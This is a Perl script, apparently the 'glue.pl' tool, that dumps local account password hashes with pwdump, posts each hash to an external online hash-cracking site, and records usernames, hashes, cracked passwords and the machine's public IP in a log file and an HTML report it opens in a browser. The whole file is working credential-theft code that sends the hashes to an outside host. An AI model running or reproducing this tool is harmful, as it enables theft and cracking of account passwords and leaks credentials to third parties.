#!/usr/bin/env perl

use strict;

use LWP::UserAgent;
use Time::HiRes qw(time);

sub arch {
  my $a = "32";

  $a = "64" if lc $ENV{'PROCESSOR_ARCHITECTURE'} eq "amd64";
  $a = "64" if lc $ENV{'PROCESSOR_ARCHITEW6432'} eq "amd64";

  return $a;
}

sub os {
  my $o = $^O;

  if ($o eq "MSWin32" or $o eq "cygwin") {
    $o = "windows";
  } elsif ($o eq "linux") {
    $o = "linux";
  } elsif ($o eq "darwin") {
    $o = "mac";
  } else {
    $o = "unix";
  }

  return $o;
}

sub curl {
  my ($url, $method, $headers) = @_;

  my $ua = LWP::UserAgent->new;

  my $req = "";

  if ($method eq "post") {
    $req = HTTP::Request->new(POST => $url);

    $req->content_type("application/x-www-form-urlencoded");
    $req->content($headers);
  } else {
    $req = HTTP::Request->new(GET => $url);
  }

  my $res = $ua->request($req);

  if ($res->is_success) {
    return $res->content;
  } else {
    return "error";
  }
}

sub default_web_browser {
  my $browser = "open";         # mac

  my $o = os;
  if ($o eq "linux") {
    $browser = "x-www-browser";
  } elsif ($o eq "windows") {
    $browser = "start";
  }

  return $browser;
}

sub canhazip {
  my $ip = curl("http://icanhazip.com", "get", "");
  $ip =~ s/\n//;

  return $ip;
}

sub dump_accounts {
  my $a = arch;
  my $flag64 = "";
  $flag64 = "-x" unless $a eq "32";

  my $command = "pwdump $flag64 127.0.0.1 2>&1";
  my $output = qx($command);
  
  my $accounts = {};
  
  while ($output =~ m/(.*):[0-9]+:.*:([a-zA-Z0-9]+):::/g) {
    my ($username, $hash) = ($1, $2);
    $accounts->{$username} = $hash;
  }

  return $accounts;
}

sub rainbow {
  my $hash = shift;

  my $password = "";

  my $delay = 2;                # sec
  sleep $delay;                 # prevent DoS

  my $output = curl("http://www.onlinehashcrack.com/free-hash-reverse.php", "post", "hashToSearch=$hash&searchHash=Search");

  if ($output =~ m/letter\-spacing:1\.2px">(.*)<\/b><br \/>/) {
    $password = $1;
  }

  return $password;
}

sub record {
  my ($ip, $encrypted_accounts, $decrypted_accounts, $webpage) = @_;

  my $t = time; # ms

  my $record_filename = "$t.log";

  print "Recording in $record_filename\n";

  open my $record, ">", "$record_filename";

  print $record "IP Address: $ip\n";

  for my $username (keys %$encrypted_accounts) {
    my $hash = $encrypted_accounts->{$username};
    my $password = $decrypted_accounts->{$username};

    print "\nUsername: $username\n";
    print "Hash: $hash\n";
    print "Password: $password\n\n";

    print $record "Username: $username\n";
    print $record "Hash: $hash\n";
    print $record "Password: $password\n\n";
  }

  close($record);

  my $begin_content = <<END;
<html>
<head>
<title>Report</title>
<link rel="stylesheet" href="stylesheet.css" type="text/css" />
</head>
<body>
<center>
<h1>Accounts on this computer ($ip)</h1>
<h4><a href="https://github.com/mcandre/glue">glue.pl</a></h4>
END

  my $end_content = <<END;
</center>
</body>
</html>
END

  open my $webpage, ">", $webpage;

  print $webpage $begin_content;

  for my $username (keys %$encrypted_accounts) {
    my $hash = $encrypted_accounts->{$username};
    my $password = $decrypted_accounts->{$username};

    my $account = "<h3>$username / $hash ";

    $account .= "/ <span class=\"password\">$password</span>" if $password ne "";

    $account .= "</h3>";

    print $webpage $account;
  }

  print $webpage $end_content;

  close($webpage);
}

sub show {
  my ($webpage) = @_;

  my $browser = default_web_browser;
  my $command = "$browser $webpage";
  system $command;
}

my $ip = canhazip;

print "Accounts on this computer ($ip)\n";

my $encrypted_accounts = dump_accounts;
my $decrypted_accounts = {};

while (my ($username, $hash) = each(%$encrypted_accounts)) {
  my $password = rainbow $hash;
  $decrypted_accounts->{$username} = $password;
}

my $webpage = "report.html";

record($ip, $encrypted_accounts, $decrypted_accounts, $webpage);
show($webpage);
